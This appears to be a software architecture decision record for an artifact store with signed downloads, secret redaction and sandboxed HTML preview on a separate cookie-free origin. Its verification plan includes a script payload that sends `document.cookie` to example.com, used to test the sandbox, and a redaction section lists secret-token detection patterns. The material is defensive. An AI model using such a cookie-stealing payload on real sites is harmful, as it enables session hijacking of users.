# ADR-0020 — Artifact store: one interface, a shared-directory dev backend, an S3-compatible contract, and HTML preview on a cookie-free origin

- **Date:** 2026-10-15
- **Status:** **Proposed** (the local backend will be Accepted when case 16 passes; the S3 backend is a contract, not an implementation)
- **Owners:** M3 implementation workers (control plane, worker runtime, UI artifacts page)
- **Related decisions / contracts:** D-014 (**Proposed**, object store with S3-compatible production backend and dev local fallback), D-024 (**Open**, checkpoint strategy — this record provides the byte backend it needs), D-018, D-023, ADR-0013 (no multi-MB payloads in rows; forward-only migrations), ADR-0014 (`/api/v1`, problem+json, 404-not-403, audit denials), ADR-0016 (fenced worker writes: an artifact row is a turn-scoped write), ADR-0017 (checkpoint payloads, workspace exclusions), ADR-0018 (materialized secrets never become artifacts), ADR-0019 (`/tmp` prohibition — the artifact spool is not a temp dir either), `communication-spec/02-system-architecture.md` (`ArtifactStore` interface, "S3-compatible artifact store recommended for deployed multi-replica APIs; dev fallback to local filesystem; avoid storing multi-MB logs in database rows", "artifacts in separate blob store"), `communication-spec/09-api-events-data.md` (`GET /artifacts/{id}` with signed controlled download; "HTML previews through separate sandbox origin"; `artifacts` table family; `artifact.created`), `communication-spec/01-domain-model.md` ("Artifact: persistent typed binary/text object with ownership, storage URI, hash, sensitivity"; "artifacts are separately stored documents, reports, screenshots, patches and binary outputs"), `communication-spec/06-collaboration-identity.md` (authorization at artifact downloads; `internal|restricted|secret` labels; retention strategy), `communication-spec/10-ui-design-handoff.md` ("generated untrusted HTML artifacts open in sandboxed preview, separate origin"; project detail `Artifacts`; `12-test-strategy.md` cases 15 and 16; `11-build-roadmap.md` M3.

## Context

M3 is the first milestone that has to *keep* something: a Markdown report, a screenshot, an HTML test
report, and — because ADR-0017 ruled that checkpoints are bundles/diffs and not copied worktrees —
the checkpoint payload itself. `02` already gives the interface in one line
(`Put`/`Open`), already says the blob store is separate from the journal, and already states the
dev/prod split. `09` says downloads are "signed controlled" and HTML previews come "through separate
sandbox origin". `12-test-strategy.md` case 16 is the sharp one: an **HTML artifact containing a
script payload**, rendered in a restricted viewer, that must not reach the Communication origin or
cookies.

The topology decides most of this before any library choice. The lab runs **two API replicas plus one
worker as three containers** (`compose.yml`), and the worker's `/workspaces` volume is deliberately
not mounted into the API pods (`02`: "do not mount it into API pods"). So an artifact written by the
worker into its own workspace is invisible to the API that must serve it, and `09`'s browser-facing
`GET /artifacts/{id}` cannot be answered by a process that shares nothing with the writer. A
third constraint comes from ADR-0016: the worker is only ever allowed to speak about a turn while
holding its lease triple, so an artifact row must be written under the same fencing rule as a
transcript append — an un-fenced `artifact.created` would let a dead worker publish an object a live
worker never produced.

And one constraint comes from M0: ADR-0017/ADR-0019 measured that a nono-sandboxed child can write
`/tmp` even with a single grant, so a spool area that an agent could reach must never be a temp
directory, and must never be a path from which a file is later trusted as an artifact.

## Options considered

| Option | Advantages | Disadvantages | Evidence |
|---|---|---|---|
| **A (selected).** Content-addressed object backend behind `ArtifactStore`; **dev = a dedicated shared directory volume** (`artifacts` named volume: worker rw, both API replicas ro), **deployed = S3-compatible** with a contract pinned now and conformance proven later | One volume, one interface, zero new services in the one-command stack; multi-replica reads work because both replicas mount the same bytes; immutability falls out of content addressing (`sha256` in the key); rows stay metadata (`02`) | Still single-host: the dev backend is not survivable across hosts, so it must never be called durable storage; "S3-compatible" is a *written contract* in M3, not a running implementation, and D-014 stays Proposed because of that | `compose.yml` (three containers, one named volume per concern); `02` § "Data / infrastructure plan"; `09` artifact routes |
| B. Bytes in Postgres (`bytea`) | One store, transactions for free, backup story identical to everything else | Directly against `02` ("avoid storing multi-MB logs in database rows"; "artifacts in separate blob store"); bloats the one component that is already the single failure domain; a report screenshot becomes a DB migration risk | Rejected on spec grounds |
| C. Worker serves its own artifacts over an authenticated internal HTTP endpoint | No shared filesystem at all; artifacts stay where the bytes are | `09` forbids the shape ("Do not make browser API accidentally expose worker internal service endpoints. … direct worker API, if added, requires mutual authentication and short-lived authorization") and no worker mTLS exists; also pins artifact reads to a live worker, so history dies with it | Compared; deferred, not chosen |
| D. MinIO as a compose service so the S3 path is the *only* path | The dev stack then exercises production code | A new runtime dependency in the acceptance gate and a second storage engine to operate locally, which `12-test-strategy.md`'s lab does not need to prove M3; would be a dependency added without owner sign-off | AGENTS.md "No new dependencies without flagging" |
| **Preview: distinct hostname on the same listener** (`http://preview.localhost:…` → `/preview/{token}`) (selected) | Cookies are host-scoped, so a document loaded from `preview.localhost` carries no `localhost` session cookie; CSP `sandbox` gives it an opaque origin, so it cannot read the app's DOM/storage; no new service, no new certificate, works under `10-ui-design-handoff.md`'s browser verification with Playwright | Requires `preview.localhost` to resolve (it does on Linux; Windows needs a hosts entry or a second port — recorded, not waved away) and forbids multi-file HTML reports (relative sub-resource fetches would leave the sandboxed origin) | `09` "HTML previews through separate sandbox origin"; `10` "separate origin"; `12` case 16 |
| Preview via `srcdoc`/Blob URL inside the app origin | No new host, no routing | **Rejected and this is the trap:** same-origin by construction, so the artifact script reads the session cookie and calls `/api/v1` as the user; CSP sandbox cannot undo the origin | Case 16 exists precisely to catch it |
| Preview via a *different port* on the same hostname | Feels isolated | Rejected: different **origin**, same **site** — `SameSite=Lax` cookies are attached per *site*, so a subresource from `localhost:18085` inside a `localhost:18080` page still carries the session cookie. Port changes do not stop case 16 | Cookie scope semantics; `12` case 16 |

## Decision

### 1. Interface (`internal/artifacts`, no SDK types in `internal/domain`)

```go
type Ref struct { ID, ProjectID, StorageBackend, StorageKey, SHA256 string; SizeBytes int64 }

type Input struct {                  // streamed in; never buffered whole in memory
    ProjectID, RunID, NodeExecutionID, AttemptID, ConversationID, TurnID, WorkerID string
    Name, Kind, MediaType, Sensitivity string
    ExpiresAt *time.Time
    Body io.Reader
}

type Store interface {
    Put(ctx context.Context, in Input) (Ref, error)      // content-addressed; idempotent on digest
    Open(ctx context.Context, ref Ref) (io.ReadCloser, int64, error)
    Stat(ctx context.Context, ref Ref) (Ref, error)
    Delete(ctx context.Context, ref Ref) error           // retention sweep only
    Presign(ctx context.Context, ref Ref, ttl time.Duration, disposition string) (URL string, ExpiresAt time.Time, err error)
}
```

`Presign` on the local backend returns a URL on this same API whose token is an HMAC over
`(artifact_id, digest, exp)` keyed by a deployment secret — a *controlled signed download* (`09`) in
both backends, so the API surface never has to know which one is configured.

### 2. Keys, kinds, and the table

- Key layout (`kind ∈ markdown|image|html|json|patch|archive|checkpoint`):
  `<bucket-or-root>/<project-id>/<kind>/<first-2>/<sha256><ext-by-media-type>` — content-addressed,
  so a second Put of the same bytes is a no-op and a re-download is verifiable; **immutable after
  `ready`** (there is no overwrite path, and `Delete` exists only for retention).
- `artifacts`: `id`, `organization_id`, `project_id` (NOT NULL — the artifact's authorization scope is
  its project, per `06`), `run_id`, `node_execution_id`, `attempt_id`, `conversation_id`, `turn_id`,
  `worker_id`, `name`, `kind`, `media_type`, `sha256`, `size_bytes`, `storage_backend`
  (`local|s3`), `storage_key`, `sensitivity` (`standard|internal|restricted|secret`), `state`
  (`uploading|ready|orphan|deleted`), `redaction_count`, `created_by`, `created_at`, `ready_at`,
  `expires_at`, `deleted_at`.
  Indexes: `(project_id, created_at DESC, id DESC)` (listing), partial
  `(state) WHERE state='uploading'` (sweep), partial `(id) WHERE state='ready' AND expires_at IS NOT NULL`
  (retention), `(sha256)` (dedupe lookup), and a UNIQUE `(project_id, kind, sha256)` so a retry cannot
  double-count bytes.
- **State machine, and why `uploading` exists:** bytes land first, the row is inserted in one fenced
  transaction with `artifact.created`, and `state` flips to `ready` in that same transaction. A row
  stuck at `uploading` (worker died between Put and the transaction) is swept to `orphan` by the
  existing reconciler pass; bytes with no row at all are deleted after a grace interval. `01` invariant
  4's spirit applies: no `ready` artifact without bytes, no event without a row.
- Size limits (default per-kind caps, e.g. 25 MB html/json/patch, 10 MB image) enforced at Put with a
  hard cap; over-limit is refused with a problem detail, not truncated.

### 3. Sensitivity gates (06's labels, applied in SQL not in React)

| `sensitivity` | list | metadata | content | HTML preview | who |
|---|---|---|---|---|---|
| `standard` | members | members | members (contributor+) | members | — |
| `internal` | members | members | members (contributor+) | members | default for run output |
| `restricted` | members (metadata only) | maintainer+ | maintainer+ | **never** | screenshots, raw tool dumps |
| `secret` | **not listed at all** | maintainer+ | **no download path in M3** | **never** | reserved so the enum exists before the policy that fills it |

Visibility is always answered with a project predicate in the query (`09`: "Every sensitive query
includes project permission predicate, not a client-controlled header"), a non-member gets `404`
(ADR-0014 §3) and an `audit_events` row with `outcome='denied'` — that is case 15's artifact half.
`restricted` listings include the name, kind, size and sensitivity but no `storage_key`, and preview
tokens are minted for nothing but `standard`/`internal` HTML/images.

### 4. Redaction and exclusion, before bytes are trusted

`Put` is not called with arbitrary agent-chosen content. The worker:
(a) refuses any path in ADR-0018's exclusion set and ADR-0008's staging paths (`.claude/`, `.agents/`,
`.codex/`, `apm_modules/`, the APM-written `.gitignore`, every materialized `env_file` target) — an
attempt to publish one is an error, not a filtered upload;
(b) runs a bounded secret scan over text media against the values it materialized for this unit
(ADR-0018 clause 7) plus a pattern list (PEM blocks, `AWS…`/`ASIA…` keys, `ghp_`/`github_pat_`,
`xox[baprs]-`, long base64 in `KEY=value` shape), substituting `***redacted(N)***` and recording
`redaction_count` so "the scanner saw nothing" is distinguishable from "the scanner is broken";
(c) records `truncated` for anything it capped. Redaction stays **best-effort defense-in-depth**
(05's threat model says so in terms) and is never described as sanitization: a `secret`-bearing HTML
report that survives the scanner is still a leak, which is exactly why `sensitivity='secret'` has no
download path in M3 and why case 12 greps every stored artifact for the sentinel.

### 5. Routes

- `GET /api/v1/projects/{projectId}/artifacts` — list, sensitivity-filtered, paginated.
- `GET /api/v1/artifacts/{artifactId}` — metadata + `preview_url` when kind/sensitivity allow it.
- `GET /api/v1/artifacts/{artifactId}/content` — streamed bytes after authz, `Content-Type` from
  `media_type` **except** `text/html`, which is served as `text/plain; charset=utf-8` with
  `Content-Disposition: attachment` from this origin: a download link must never be a renderer.
- `POST /api/v1/artifacts/{artifactId}/preview-token` → `{url, token, expires_at}` (default TTL 5 min,
  one artifact per token, minted only for `standard|internal`, audited as an access, since
  `06` lists artifact downloads as an authorization boundary).
- `GET /preview/{token}` — **served only on the preview host**; see 6.
No route ever returns bytes for an `uploading|orphan|deleted` row, and no route accepts a client-supplied
`storage_key`.

### 6. The preview origin, pinned by response headers

`http://preview.localhost:<lb-port>/preview/{token}`, same binary, host-gated handler; the app origin
answers `404` for `/preview/*` and the preview host answers `404` for everything else. The response
carries, literally:

```
Content-Type: text/html; charset=utf-8          (from the artifact's media_type, html only)
Content-Security-Policy: sandbox                (no allow-same-origin, no allow-scripts-… exceptions)
Content-Security-Policy: default-src 'none'; img-src data: blob:; style-src 'unsafe-inline'
X-Content-Type-Options: nosniff
Content-Disposition: inline
Referrer-Policy: no-referrer
Cache-Control: no-store
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

`Sandbox:` not used — CSP `sandbox` is the mechanism, applied on the *document*. The app embeds it as
`<iframe sandbox="" referrerpolicy="no-referrer" src="…preview.localhost/preview/{token}">` with no
`allow-same-origin` and no `allow-scripts`: **scripts do not execute inside an opaque-sandboxed
iframe, so case 16's script payload is inert *by the embed*, and the headers above are what make the
tab opened directly equally harmless.** Two mechanisms, deliberately independent — if the UI later
wants script-bearing previews it must pass case 16 again with the iframe relaxed, not discover the
answer in production. Because sub-resource loads would escape the origin, M3 supports **self-contained
HTML only** (inline CSS, `data:` images); multi-file HTML reports are an explicit non-goal.
The `X-Communication-Replica` header stays observable, so a preview served by the "wrong" replica is a
fact a test can see (ADR-0014 §7).

### 7. S3-compatible backend contract (written now, conformance later)

`internal/artifacts/s3` against the AWS SigV4 REST surface with path-style addressing off, using only:
`PutObject` (with `ServerSideEncryption=AES256`, `Content-Type`, `Content-Length`), `GetObject` (+`Range`
for resume), `HeadObject`, `DeleteObject`, `ListObjectsV2` (sweep), and presigned GET. Bucket
requirements: no public access, no anonymous read, versioning on (so `Delete` is a marker, and
retention is a lifecycle rule rather than our sweep alone), lifecycle rules configured by the operator
rather than by us, prefix per deployment. **Prohibited:** `PutObjectAcl`, `ListAllMyBuckets`, any
`Create*` call, and STS credentials broader than one bucket prefix.
Credentials come from the deployment's own provider chain in the **worker** and **serve** processes —
never through `SecretRef`, because a storage credential that can write artifacts cannot be an artifact
of the system it stores. S3 keys may contain no user-supplied path segments: the key is built from
server-side ids only.

### 8. Checkpoints are just artifacts with a strict manifest

ADR-0017's bundle/diff payload is stored as `kind=checkpoint` with a JSON manifest
(`{base_commit, head_commit, bundle_sha256, modified_paths[], excluded_paths[], diff_sha256}`) as a
companion `kind=json` object, both `internal` at minimum, and `02`'s rule applies verbatim: they
"must exclude ignored secrets" — enforced by ADR-0018 clause 7's exclusion set, not by `.gitignore`.
**D-024 remains Open.** M3's contribution is the byte backend and the manifest, not a
recoverability claim.

## Consequences

- Positive: one interface serves `artifact.created`, the J8/J10 artifact pages, the checkpoint payload
  D-024 needs, and `02`'s "avoid multi-MB logs in rows" without a second store in the dev loop.
- Positive: content addressing plus the UNIQUE key makes retries cheap and duplicate-free, which is
  the same idempotency property `09` asks of external actions.
- Positive: case 16 has two independent mechanisms rather than one clever one.
- Cost: the dev topology now depends on a second shared volume; a deployment with replicas on different
  hosts must use the S3 backend, and **readiness should say so** — a `serve` replica that cannot see the
  artifact root reports `503`, exactly as it does for a stale schema (ADR-0013 §6), rather than serving
  a project page whose artifacts 404 at half the URLs.
- Cost: `Presign` needs a deployment secret, which enters the same keyring conversation as ADR-0018's
  master key (separate purpose string, same custody).
- Limitation (this is the honest one, and it is why D-014 stays Proposed): **the S3 backend is not
  implemented in M3.** A written contract with a conformance suite that has never run against MinIO or
  S3 is a specification, not a capability, and no sentence in `docs/` may call multi-replica-object-storage
  "supported" before it runs.
- Limitation: self-contained HTML only; no screenshots bundle, no multi-page test report, no PDF viewer.
- Limitation: no artifact GC beyond retention + orphan sweep; dedupe means a project cannot delete one
  run's copy without a reference count, which M4 should add when runs multiply.
- Ops: `worker` must mount the artifact root writable and the API replicas read-only; a mis-mounted
  replica is a readiness failure, not a runtime 500.

## Security/privacy

Three boundaries named separately: **authorization** (project predicate in the query, `404` for
non-members, audit rows on refusal — case 15); **delivery** (the app origin never renders HTML, the
preview origin never sees a cookie because cookies are host-scoped and `preview.localhost` ≠
`localhost`; CSP `sandbox` yields an opaque origin so the document cannot reach the app's storage or
DOM, and the iframe omits `allow-scripts` so the payload in case 16 does not run at all); and
**content** (secret scan + exclusion set + `redaction_count`, with `sensitivity='secret'` having no
download path).
Tokens are single-artifact, short-lived, signature-checked, and carry the artifact digest, so a token
cannot be re-pointed at another row. `restricted` never previews. Range requests are refused on the
preview origin (partial rendering of an untrusted document buys nothing).
Storage keys are server-built; `name` is metadata and is sanitized for the download filename only
(no path separators, no control characters). `06`'s retention obligation becomes `expires_at` plus a
sweep and a documented operator lifecycle rule for S3, not a promise.
Known gaps stated, not hidden: the artifact volume is readable by every project on that worker (the
`local` backend has no per-tenant encryption, and ADR-0019's single-uid caveat applies to bytes too);
a worker that can write the store can plant a `standard` artifact for its own project (which is within
its authority) but not for another's (the row write is project-scoped and turn-fenced per ADR-0016);
and the secret scanner is a best-effort list, explicitly not a guarantee (ADR-0018 Security).

## Verification

Nothing is claimed. `docs/compatibility/` has no artifact row, and no artifact code exists yet — this
record is the contract the implementation is written against, and it moves to Accepted only when the
following run with literal output (`docs/m3-contract.md` § "M3 exit test plan", which is where these
are scripted):

1. **Store contract (unit + integration, real filesystem):** Put→Open round-trip byte-identical,
   second Put of the same digest returns the same `storage_key` and creates no new object, `Open` on a
   `uploading|orphan` row fails, oversize Put refused, and `Stat` on a tampered file (content changed
   under the key) reports a digest mismatch — the check that makes content addressing worth anything.
2. **Fencing (case 15 adjacent, ADR-0016 § 9.2):** a worker whose turn lease expired cannot insert an
   `artifacts` row or append `artifact.created` (the fenced store helper is the only path), and the
   bytes it wrote are swept to `orphan` rather than served.
3. **`12` case 16:** plant an artifact whose HTML body contains
   `<script>fetch('/api/v1/me',{credentials:'include'});new Image().src='https://example.com/c?'+document.cookie</script>`,
   open the project artifact page as an authenticated member, and observe: the iframe is
   `preview.localhost`, the app's session cookie was **not** sent with the preview request (asserted
   from the API's own access log line for the preview GET showing no `Cookie` header), the document
   cannot read the parent (`SecurityError` or no `contentWindow.document`), CSP `sandbox` reported by
   the response headers, the artifact's script did not execute (`allow-scripts` absent), and — as the
   belt-and-braces case — a *top-level* navigation to the preview URL still executes nothing and
   carries no cookie.
4. **`12` case 15:** a user without Project B membership probes `GET /api/v1/projects/{id}/artifacts`,
   `GET /api/v1/artifacts/{id}`, `…/content`, `…/preview-token`, the preview URL from a stale token and
   the project SSE stream: every one is `404`, with `audit_events.outcome='denied'`, and none of them
   discloses existence, name, kind or size (`09`: "all denied without metadata leak").
5. **`12` case 12 (artifact half):** grep every object under the artifact root, plus every
   `artifacts.storage_key` target, for the planted sentinel value → zero matches, and
   `redaction_count` is `0` for every legitimately created artifact (proof the scan is present without
   being a lie about content).
6. **Delivery hardening:** `curl -D-` against `…/content` for a `text/html` artifact shows
   `text/plain` + `Content-Disposition: attachment`; `/preview/<valid>` on the app origin is `404`;
   `/api/v1/…` on the preview origin is `404`; an expired or re-signed-elsewhere token is refused.
7. **S3 contract:** NOT claimed. When the conformance suite is written it must run against MinIO in CI
   (or an owner-provided bucket) and produce the same seven results as gate 1 plus SSE, Range, presign
   expiry and lifecycle-rule behaviour; until then D-014 stays **Proposed** and the docs say
   "single-host dev backend".

## Migration/rollback

`00004_m3_secrets_artifacts.sql` creates `artifacts` only (draft DDL in `docs/m3-contract.md`);
nothing rewrites existing rows, `ExpectedSchemaVersion()` advances by one, and the new routes 404
until a worker writes something. Deploy order: `migrate` → `worker` (rw artifact root) → `serve`
replicas (ro artifact root, readiness gated on its visibility).

Forward-only, per ADR-0013. `storage_backend` is per-row, so switching `local → s3` migrates nothing
historically: old rows stay readable while the volume exists, new rows go to S3, and a `doctor` check
reports the count of `local` rows still referenced. Removing the local backend entirely is a
`migrate-artifacts` command (later milestone, not M3) plus dropping a volume — the rows survive because
they carry `sha256`, which is the property that makes an object-store swap a copy rather than a
re-derivation. Rollback of the preview origin (e.g. it turns out `preview.localhost` does not resolve
in a target deployment) is a config change to the LB and one env var
(`COMMUNICATION_PREVIEW_BASE_URL`) — the token format and the app origin's refusal to render HTML do
not change, and neither is a wire change.
